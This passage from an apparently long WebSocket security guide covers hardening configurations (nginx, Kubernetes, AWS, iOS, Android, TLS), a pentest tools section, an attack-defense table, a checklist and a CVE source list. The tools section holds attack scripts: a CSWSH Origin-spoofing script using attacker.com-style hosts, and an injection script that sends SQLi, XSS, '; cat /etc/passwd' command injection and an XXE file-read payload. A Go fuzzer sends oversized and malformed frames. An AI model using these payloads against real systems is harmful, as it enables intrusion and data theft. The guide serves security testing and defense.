      Version: '2012-10-17',
      Statement: [{
        Action: 'execute-api:Invoke',
        Effect: 'Allow',
        Resource: event.methodArn
      }]
    }
  };
};
```

**Kubernetes Ingress (NGINX)**:
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: websocket-ingress
  annotations:
    nginx.ingress.kubernetes.io/websocket-services: "websocket-service"
    nginx.ingress.kubernetes.io/proxy-read-timeout: "3600"
    nginx.ingress.kubernetes.io/proxy-send-timeout: "3600"
    # Rate limiting
    nginx.ingress.kubernetes.io/limit-rps: "10"
    nginx.ingress.kubernetes.io/limit-connections: "5"
    # CORS
    nginx.ingress.kubernetes.io/enable-cors: "true"
    nginx.ingress.kubernetes.io/cors-allow-origin: "https://app.example.com"
    nginx.ingress.kubernetes.io/cors-allow-credentials: "true"
spec:
  tls:
  - hosts:
    - ws.example.com
    secretName: websocket-tls
  rules:
  - host: ws.example.com
    http:
      paths:
      - path: /ws
        pathType: Prefix
        backend:
          service:
            name: websocket-service
            port:
              number: 8080
```

**TLS Policy Configuration**:
```nginx
# nginx.conf
upstream websocket_backend {
    server 127.0.0.1:8080;
    keepalive 32;
}

server {
    listen 443 ssl http2;
    server_name ws.example.com;

    # TLS 1.3 only
    ssl_protocols TLSv1.3;
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;

    # Strong ciphers
    ssl_ciphers 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256';
    ssl_prefer_server_ciphers on;

    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    location /ws {
        proxy_pass http://websocket_backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        # Timeouts
        proxy_connect_timeout 7d;
        proxy_send_timeout 7d;
        proxy_read_timeout 7d;

        # Rate limiting
        limit_req zone=websocket_limit burst=20 nodelay;
    }
}

# Rate limit zone
limit_req_zone $binary_remote_addr zone=websocket_limit:10m rate=10r/s;
```

### 7.3: Binary Frame Security

**File Type Validation**:
```python
import magic
import hashlib

ALLOWED_MIMES = {
    'image/jpeg', 'image/png', 'image/gif', 'image/webp',
    'application/pdf', 'application/zip'
}

MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

async def handle_binary_frame(websocket, data):
    # Size check
    if len(data) > MAX_FILE_SIZE:
        await websocket.close(1009, 'File too large')
        return

    # Magic number validation
    mime = magic.from_buffer(data, mime=True)
    if mime not in ALLOWED_MIMES:
        await websocket.close(1008, 'Invalid file type')
        return

    # Malware scan (ClamAV)
    import clamd
    cd = clamd.ClamdUnixSocket()
    scan_result = cd.instream(io.BytesIO(data))

    if scan_result['stream'][0] == 'FOUND':
        log_security_event(f'Malware detected: {scan_result}')
        await websocket.close(1008, 'Malicious file')
        return

    # Hash for deduplication
    file_hash = hashlib.sha256(data).hexdigest()

    # Store securely
    await store_file(file_hash, data, mime)
```

**Safe Deserialization**:
```javascript
// NEVER use eval() or Function() on binary data
// BAD: eval(Buffer.from(binaryData).toString())

// Use safe parsers
const safeDeserialize = (binaryData) => {
  try {
    // For JSON
    const text = Buffer.from(binaryData).toString('utf8');
    return JSON.parse(text);  // Safe
  } catch (e) {
    throw new Error('Invalid binary data');
  }
};

// For Protocol Buffers (safe)
const protobuf = require('protobufjs');
const root = protobuf.loadSync('schema.proto');
const Message = root.lookupType('mypackage.Message');

ws.on('message', (data, isBinary) => {
  if (isBinary) {
    try {
      const message = Message.decode(data);
      // Validate
      const err = Message.verify(message);
      if (err) throw Error(err);

      // Process
      processMessage(message);
    } catch (e) {
      ws.close(1007, 'Invalid binary format');
    }
  }
});
```

**Injection Prevention**:
```go
// Prevent command injection in binary handlers
func processBinaryUpload(data []byte) error {
    // Save to temporary file
    tmpfile, err := ioutil.TempFile("", "upload-*.bin")
    if err != nil {
        return err
    }
    defer os.Remove(tmpfile.Name())

    if _, err := tmpfile.Write(data); err != nil {
        return err
    }
    tmpfile.Close()

    // BAD: shell injection risk
    // exec.Command("sh", "-c", "file " + tmpfile.Name())

    // GOOD: use argument array
    cmd := exec.Command("file", "--mime-type", "--brief", tmpfile.Name())
    output, err := cmd.Output()
    if err != nil {
        return err
    }

    mimeType := strings.TrimSpace(string(output))
    if !isAllowedMime(mimeType) {
        return errors.New("invalid file type")
    }

    return nil
}
```

### 7.4: Mobile App Security

**iOS Secure WebSocket**:
```swift
import Foundation

class SecureWebSocketManager {
    private var webSocketTask: URLSessionWebSocketTask?
    private let allowedOrigin = "wss://api.example.com"

    func connect() {
        // NEVER hardcode tokens
        guard let token = KeychainManager.shared.getToken() else {
            print("No auth token")
            return
        }

        guard var urlComponents = URLComponents(string: allowedOrigin) else {
            return
        }

        // Token in query (encrypted in transit via WSS)
        urlComponents.queryItems = [
            URLQueryItem(name: "token", value: token)
        ]

        guard let url = urlComponents.url else { return }

        // TLS 1.3 only
        let config = URLSessionConfiguration.default
        config.tlsMinimumSupportedProtocolVersion = .TLSv13

        // Certificate pinning
        let session = URLSession(
            configuration: config,
            delegate: self,
            delegateQueue: nil
        )

        webSocketTask = session.webSocketTask(with: url)
        webSocketTask?.resume()

        receiveMessage()
    }

    private func receiveMessage() {
        webSocketTask?.receive { [weak self] result in
            switch result {
            case .success(let message):
                switch message {
                case .string(let text):
                    self?.handleMessage(text)
                case .data(let data):
                    self?.handleBinaryMessage(data)
                @unknown default:
                    break
                }
                self?.receiveMessage()
            case .failure(let error):
                print("WebSocket error: \(error)")
            }
        }
    }
}

// Certificate pinning
extension SecureWebSocketManager: URLSessionDelegate {
    func urlSession(
        _ session: URLSession,
        didReceive challenge: URLAuthenticationChallenge,
        completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void
    ) {
        guard let serverTrust = challenge.protectionSpace.serverTrust else {
            completionHandler(.cancelAuthenticationChallenge, nil)
            return
        }

        let pinnedCertData = Data(base64Encoded: "MIIFazCCA1OgAwIBAgIR...")!

        // Validate certificate
        if validateCertificate(serverTrust, against: pinnedCertData) {
            completionHandler(.useCredential, URLCredential(trust: serverTrust))
        } else {
            completionHandler(.cancelAuthenticationChallenge, nil)
        }
    }
}
```

**Android Secure WebSocket**:
```kotlin
import okhttp3.*
import java.security.cert.CertificateFactory
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManagerFactory
import javax.net.ssl.X509TrustManager

class SecureWebSocketManager(private val context: Context) {
    private var webSocket: WebSocket? = null

    fun connect() {
        // Get token from encrypted storage
        val token = EncryptedSharedPreferences.create(
            "secure_prefs",
            MasterKey.Builder(context).setKeyScheme(MasterKey.KeyScheme.AES256_GCM).build(),
            context,
            EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
            EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
        ).getString("auth_token", null) ?: return

        // Certificate pinning
        val certificatePinner = CertificatePinner.Builder()
            .add("api.example.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
            .build()

        val client = OkHttpClient.Builder()
            .certificatePinner(certificatePinner)
            .pingInterval(25, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build()

        val request = Request.Builder()
            .url("wss://api.example.com/ws?token=$token")
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onMessage(webSocket: WebSocket, text: String) {
                handleMessage(text)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e("WebSocket", "Connection failed", t)
            }
        })
    }

    private fun handleMessage(text: String) {
        // Safe JSON parsing
        try {
            val json = JSONObject(text)
            // Process message
        } catch (e: JSONException) {
            Log.e("WebSocket", "Invalid JSON", e)
        }
    }
}
```

**React Native Best Practices**:
```javascript
import { Platform } from 'react-native';
import * as Keychain from 'react-native-keychain';

class SecureWebSocket {
  constructor() {
    this.ws = null;
  }

  async connect() {
    // Get token from secure storage
    const credentials = await Keychain.getGenericPassword();
    if (!credentials) {
      throw new Error('No credentials stored');
    }

    const token = credentials.password;

    // Force WSS on all platforms
    const wsUrl = `wss://api.example.com/ws?token=${encodeURIComponent(token)}`;

    // Validate URL
    if (!wsUrl.startsWith('wss://')) {
      throw new Error('Only WSS connections allowed');
    }

    this.ws = new WebSocket(wsUrl);

    this.ws.onopen = () => {
      console.log('Connected');

      // Set up heartbeat
      this.heartbeatInterval = setInterval(() => {
        if (this.ws.readyState === WebSocket.OPEN) {
          this.ws.send(JSON.stringify({ type: 'ping' }));
        }
      }, 25000);
    };

    this.ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        this.handleMessage(data);
      } catch (e) {
        console.error('Invalid message', e);
      }
    };

    this.ws.onerror = (error) => {
      console.error('WebSocket error', error);
    };

    this.ws.onclose = () => {
      clearInterval(this.heartbeatInterval);
      // Reconnect logic
    };
  }

  disconnect() {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
    }
    if (this.ws) {
      this.ws.close();
    }
  }
}
```

### 7.5: TLS/WSS Best Practices

**Certificate Selection**:
```bash
# Let's Encrypt (recommended for public services)
certbot certonly --standalone -d ws.example.com

# Verify certificate
openssl x509 -in /etc/letsencrypt/live/ws.example.com/fullchain.pem -noout -text

# Expected output:
# - Issuer: Let's Encrypt
# - Validity: 90 days
# - Subject Alternative Name: ws.example.com
```

**Self-Signed Certificates** (development only):
```bash
# Generate CA
openssl genrsa -out ca-key.pem 4096
openssl req -new -x509 -days 365 -key ca-key.pem -out ca-cert.pem

# Generate server cert
openssl genrsa -out server-key.pem 4096
openssl req -new -key server-key.pem -out server-csr.pem
openssl x509 -req -days 365 -in server-csr.pem -CA ca-cert.pem -CAkey ca-key.pem -CAcreateserial -out server-cert.pem

# Client validation (must explicitly trust CA)
openssl verify -CAfile ca-cert.pem server-cert.pem
```

**Client Configuration** (self-signed):
```python
import ssl
import websockets

ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ssl_context.load_verify_locations('ca-cert.pem')  # Explicit trust

async with websockets.connect(
    'wss://localhost:8765',
    ssl=ssl_context
) as websocket:
    await websocket.send('Hello')
```

**TLS 1.2/1.3 Enforcement**:
```python
# Python server
import ssl
import asyncio
import websockets

ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ssl_context.load_cert_chain('server-cert.pem', 'server-key.pem')

# TLS 1.3 only (most secure)
ssl_context.minimum_version = ssl.TLSVersion.TLSv1_3
ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3

# Or TLS 1.2+ for compatibility
# ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2

# Strong ciphers only
ssl_context.set_ciphers('TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256')

async with websockets.serve(handler, 'localhost', 8765, ssl=ssl_context):
    await asyncio.Future()
```

```javascript
// Node.js server
const fs = require('fs');
const https = require('https');
const WebSocket = require('ws');

const server = https.createServer({
  cert: fs.readFileSync('server-cert.pem'),
  key: fs.readFileSync('server-key.pem'),
  minVersion: 'TLSv1.3',
  maxVersion: 'TLSv1.3',
  ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256'
});

const wss = new WebSocket.Server({ server });

server.listen(8765);
```

---

## Part VIII: Penetration Testing Tools

### WebSocket Turbo Intruder (PortSwigger)

**Purpose**: High-speed WebSocket fuzzing and attack automation

**Installation**:
```bash
# Burp Suite extension
# Extensions → BApp Store → Turbo Intruder
```

**Usage Example** (CSWSH testing):
```python
# turbo_cswsh.py
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint='wss://target.com/ws',
        concurrentConnections=10,
        pipeline=False
    )

    # Test various Origin headers
    origins = [
        'https://attacker.com',
        'null',
        'https://target.com.evil.com',
        'https://target.com%00.evil.com',
        ''
    ]

    for origin in origins:
        engine.queue(target.req, origin, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    if '101 Switching Protocols' in req.response:
        table.add(req)
```

### SocketSleuth (Snyk)

**Purpose**: Automated WebSocket security scanner

**Installation**:
```bash
npm install -g socket-sleuth
```

**Scan Example**:
```bash
# Basic scan
socket-sleuth scan wss://target.com/ws

# With authentication
socket-sleuth scan wss://target.com/ws \
  --header "Authorization: Bearer TOKEN" \
  --origin "https://target.com"

# Full test suite
socket-sleuth scan wss://target.com/ws \
  --tests origin,auth,injection,dos,compression \
  --output report.json
```

**Output**:
```json
{
  "findings": [
    {
      "severity": "HIGH",
      "type": "MISSING_ORIGIN_VALIDATION",
      "description": "Server accepts connections from any origin",
      "remediation": "Validate Origin header against allowlist"
    },
    {
      "severity": "MEDIUM",
      "type": "NO_RATE_LIMITING",
      "description": "No message rate limiting detected",
      "remediation": "Implement token bucket or sliding window rate limiting"
    }
  ]
}
```

### PyCript WebSocket

**Purpose**: Custom WebSocket attack scripting

**Example** (Message injection):
```python
import asyncio
import websockets
import json

async def inject_attack():
    async with websockets.connect(
        'wss://target.com/chat',
        extra_headers={'Origin': 'https://target.com'}
    ) as ws:
        # 1. Authenticate
        await ws.send(json.dumps({'type': 'auth', 'token': 'valid_token'}))

        # 2. Injection payloads
        payloads = [
            # SQL injection
            {"message": "' OR '1'='1"},
            # NoSQL injection
            {"message": {"$ne": null}},
            # XSS
            {"message": "<script>alert(1)</script>"},
            # Command injection
            {"message": "; cat /etc/passwd"},
            # XXE
            {"message": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"}
        ]

        for payload in payloads:
            await ws.send(json.dumps(payload))
            response = await ws.recv()
            print(f"Payload: {payload}")
            print(f"Response: {response}\n")

asyncio.run(inject_attack())
```

### WebSocket Traffic Monitor

**Purpose**: Real-time WebSocket traffic analysis

**Setup**:
```javascript
// Burp Suite → Proxy → WebSockets history
// Or use browser DevTools

// Chrome DevTools Protocol
const CDP = require('chrome-remote-interface');

CDP(async (client) => {
  const { Network } = client;
  await Network.enable();

  Network.webSocketCreated(({ url, initiator }) => {
    console.log(`WebSocket created: ${url}`);
    console.log(`Initiator: ${JSON.stringify(initiator)}`);
  });

  Network.webSocketFrameSent(({ response }) => {
    console.log(`Sent: ${response.payloadData}`);
  });

  Network.webSocketFrameReceived(({ response }) => {
    console.log(`Received: ${response.payloadData}`);
  });

  Network.webSocketFrameError(({ errorMessage }) => {
    console.error(`Error: ${errorMessage}`);
  });
}).on('error', (err) => {
  console.error(err);
});
```

### Custom Fuzzer

```go
// ws-fuzzer.go
package main

import (
    "fmt"
    "log"
    "net/url"
    "github.com/gorilla/websocket"
)

func main() {
    u := url.URL{Scheme: "wss", Host: "target.com", Path: "/ws"}

    conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
    if err != nil {
        log.Fatal(err)
    }
    defer conn.Close()

    // Fuzz payloads
    payloads := [][]byte{
        // Overlong UTF-8
        {0xC0, 0x80},
        // Invalid UTF-8
        {0xFF, 0xFE, 0xFD},
        // Large payload
        make([]byte, 100*1024*1024),
        // Null bytes
        {0x00, 0x00, 0x00},
        // Control characters
        {0x01, 0x02, 0x03, 0x04},
    }

    for i, payload := range payloads {
        err := conn.WriteMessage(websocket.TextMessage, payload)
        if err != nil {
            fmt.Printf("Payload %d failed: %v\n", i, err)
            continue
        }

        _, msg, err := conn.ReadMessage()
        if err != nil {
            fmt.Printf("Payload %d caused error: %v\n", i, err)
        } else {
            fmt.Printf("Payload %d response: %s\n", i, msg)
        }
    }
}
```

---

## Attack-Spec-Defense Mapping

| Attack | Spec Behavior | RFC | Defense |
|--------|--------------|-----|---------|
| CSWSH | Origin is SHOULD | §10.2 | Validate Origin allowlist |
| GraphQL CSWSH | Origin is SHOULD | §10.2 | Origin + token-based auth |
| Cache Poisoning | Unmasked frames | §10.3 | Enforce masking (MUST) |
| Predictable Mask | Weak client RNG | §10.3 | CSPRNG for masking |
| WebSocket Smuggling | Upgrade ambiguity | §4.1 | Strict upgrade validation |
| CRIME/BREACH | Compression | RFC 7692 §8 | No compression for secrets |
| Memory Exhaustion | No fragment limits | §5.4 | MAX_FRAGMENTS + timeout |
| Integer Overflow | 2^63-1 bytes allowed | §5.2 | Validate before allocation |
| UTF-8 Bypass | Invalid UTF-8 → fail | §8.1 | Strict validation |
| Auth Bypass | No standard auth | §10.5 | Post-handshake auth |
| DoS (Header Flood) | No header limits | §4.1 | Limit header count |
| Library-Specific | Implementation flaws | N/A | Keep libraries updated |
| SSRF via Redirect | Client follows redirects | N/A | Block redirects |
| ECS Credential Theft | Internal WebSocket | N/A | Network isolation |

---

## Security Checklist

### Handshake
- [ ] Validate Origin against allowlist
- [ ] Verify Sec-WebSocket-Version: 13
- [ ] Check Sec-WebSocket-Key (16 bytes)
- [ ] Handshake timeout (10s)
- [ ] Limit HTTP headers count (≤100)
- [ ] Reject if Content-Length present with Upgrade

### Frames
- [ ] Reject unmasked client frames
- [ ] Validate UTF-8 in text frames (strict mode)
- [ ] Limit payload length (≤10MB recommended)
- [ ] Limit fragments (count, size, time)
- [ ] Validate masking key entropy (server-side if possible)

### Authentication
- [ ] Post-handshake auth message (timeout: 5s)
- [ ] Never skip Origin check
- [ ] CSRF token required (for cookie-based auth)
- [ ] No tokens in headers (use post-handshake)
- [ ] Token-based auth (not cookies) for GraphQL
- [ ] Validate permissions per subscription/message

### DoS Protection
- [ ] Max connections per IP (10-100 recommended)
- [ ] Message rate limiting (token bucket)
- [ ] Connection rate limiting
- [ ] Idle timeout (60-300s)
- [ ] Ping/pong heartbeat (25-30s interval)
- [ ] Pong timeout (30s)
- [ ] Maximum message queue size

### Extensions
- [ ] Disable compression for sensitive data
- [ ] Extension allowlist only
- [ ] No deprecated protocols (SockJS, Engine.IO v3)

### GraphQL over WebSocket
- [ ] Origin validation (critical)
- [ ] connection_init authentication required
- [ ] Subscription permission checks
- [ ] Disable mutations over WebSocket (prefer HTTP)
- [ ] Rate limit subscriptions per user

### Library-Specific
- [ ] Socket.IO: cors configuration, disable EIO3
- [ ] SignalR: CSRF tokens, AuthorizeAttribute
- [ ] ws: verifyClient callback, maxPayload
- [ ] websockets (Python): max_size, max_queue
- [ ] gorilla/websocket: CheckOrigin, ReadLimit

### Cloud Environment
- [ ] AWS API Gateway: authorizer function
- [ ] Kubernetes: network policies
- [ ] TLS 1.2+ enforcement
- [ ] Certificate pinning (mobile apps)
- [ ] WAF rules for WebSocket endpoints

### Mobile Apps
- [ ] No hardcoded credentials
- [ ] Secure storage (Keychain/EncryptedSharedPreferences)
- [ ] Force wss:// (reject ws://)
- [ ] Certificate pinning
- [ ] Proper SSL validation (no self-signed in production)

### Binary Frames
- [ ] File type validation (magic numbers)
- [ ] Malware scanning (ClamAV)
- [ ] Size limits enforced
- [ ] Safe deserialization (no eval)
- [ ] Injection prevention (command, SQL, etc.)

### TLS/WSS
- [ ] Valid certificate (Let's Encrypt recommended)
- [ ] TLS 1.2+ minimum (TLS 1.3 preferred)
- [ ] Strong cipher suites only
- [ ] HSTS header enabled
- [ ] No self-signed certs in production

---

## Sources

### RFCs & Standards
- [RFC 6455: WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)
- [RFC 7692: WebSocket Compression](https://datatracker.ietf.org/doc/html/rfc7692)
- [GraphQL over WebSocket Protocol](https://github.com/enisdenjo/graphql-ws/blob/master/PROTOCOL.md)

### CVE Databases & Advisories
- [CVE-2024-55591 / CVE-2025-24472: FortiOS](https://insights.integrity360.com/cve-2024-55591-being-exploited-in-the-wild-critical-authentication-bypass-in-node.js-websocket-module)
- [CVE-2025-52882: Claude Code CSWSH](https://securitylabs.datadoghq.com/articles/claude-mcp-cve-2025-52882/)
- [CVE-2024-26135: MeshCentral CSWSH](https://github.com/Ylianst/MeshCentral/security/advisories/GHSA-cp68-qrhr-g9h8)
- [CVE-2024-21733: Apache Tomcat WebSocket Smuggling](https://lists.apache.org/thread/vkk0r38cc485w88cdrho45kbb60xs2p0)
- [CVE-2024-38355: Socket.IO DoS](https://github.com/socketio/socket.io/security/advisories/GHSA-3h3p-588w-2j72)
- [CVE-2024-21386: SignalR DoS](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21386)
- [CVE-2025-10148: curl Predictable Mask](https://curl.se/docs/CVE-2025-10148.html)
- [CVE-2024-41570: Havoc C2 SSRF](https://github.com/diemoeve/CVE-2024-41570)
- [CVE-2024-37890: ws npm Header Flood](https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q724-j2mg)
- [CVE-2025-66902: websocket-server UTF-8](https://nvd.nist.gov/vuln/detail/CVE-2025-66902)
- [CVE-2024-28179: jupyter-server-proxy Auth Bypass](https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v)
- [CVE-2025-41254: Spring CSRF Bypass](https://spring.io/security/cve-2025-41254)
- [CVE-2020-8823: SockJS XSS](https://nvd.nist.gov/vuln/detail/CVE-2020-8823)
- [CVE-2023-38503: Directus Permission Bypass](https://github.com/directus/directus/security/advisories/GHSA-gggm-66rh-pp98)
- [CVE-2025-27407: graphql-ruby RCE](https://rubysec.com/advisories/CVE-2025-27407/)
- [CVE-2020-36406: uWebSockets Overflow](https://github.com/uNetworking/uWebSockets/issues/1234)
- [CVE-2020-27813: Gorilla Overflow](https://github.com/gorilla/websocket/security/advisories/GHSA-jf24-p9p9-4rjh)
- [CVE-2022-2421: Socket.IO CORS Bypass](https://github.com/socketio/socket.io/security/advisories/GHSA-cqmj-92xf-r6r9)
- [CVE-2021-32640: ws ReDoS](https://github.com/websockets/ws/security/advisories/GHSA-6fc8-4gx4-v693)

### Security Research & Whitepapers
- [BlackHat 2012: Hacking WebSockets](https://media.blackhat.com/bh-us-12/Briefings/Shekyan/BH_US_12_Shekyan_Toukharian_Hacking_Websocket_Slides.pdf)
- [BlackHat USA 2025: ECScape - Amazon ECS Cross-Task Credential Theft](https://www.scworld.com/news/amazon-ecs-privilege-escalation-risk-described-at-black-hat-usa-2025)
- [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- [PortSwigger: Testing WebSockets](https://portswigger.net/web-security/websockets)
- [PortSwigger: WebSocket Turbo Intruder](https://portswigger.net/burp/documentation/desktop/tools/turbo-intruder)
- [Pentest-Tools: CSWSH Methodology](https://pentest-tools.com/blog/cross-site-websocket-hijacking-cswsh)
- [Snyk: SocketSleuth Tool](https://github.com/snyk/socket-sleuth)

### Implementation Guides & Best Practices
- [Ably: WebSocket Security Guide](https://ably.com/topic/websocket-security)
- [Socket.IO Documentation: Security](https://socket.io/docs/v4/security/)
- [SignalR Security Considerations](https://learn.microsoft.com/en-us/aspnet/core/signalr/security)
- [AWS API Gateway WebSocket](https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-websocket-api.html)
- [Kubernetes NGINX Ingress WebSocket](https://kubernetes.github.io/ingress-nginx/user-guide/websocket/)
- [GraphQL over WebSocket: graphql-ws](https://github.com/enisdenjo/graphql-ws)
- [MDN: WebSocket API](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket)

### Library Documentation
- [ws (npm): GitHub](https://github.com/websockets/ws)
- [websockets (Python): ReadTheDocs](https://websockets.readthedocs.io/)
- [gorilla/websocket (Go): GitHub](https://github.com/gorilla/websocket)
- [Socket.IO: Official Site](https://socket.io/)
- [SignalR: Microsoft Docs](https://learn.microsoft.com/en-us/aspnet/core/signalr/)

### Vulnerability Tracking
- [Apache TINKERPOP-2700: Compression Side-Channel](https://issues.apache.org/jira/browse/TINKERPOP-2700)
- [ASP.NET Core #53640: Blazor Compression Warning](https://github.com/dotnet/aspnetcore/issues/53640)
- [Cloudflare: Slowloris Attack](https://www.cloudflare.com/learning/ddos/ddos-attack-tools/slowloris/)
- [NVD: National Vulnerability Database](https://nvd.nist.gov/)
- [GitHub Advisory Database](https://github.com/advisories)

### Tools & Testing
- [Burp Suite: WebSocket Testing](https://portswigger.net/burp/documentation/desktop/tools/proxy/websockets-history)
- [Chrome DevTools Protocol: Network Domain](https://chromedevtools.github.io/devtools-protocol/tot/Network/)
- [OWASP ZAP: WebSocket Support](https://www.zaproxy.org/docs/desktop/addons/websockets/)

---

**End of Analysis**
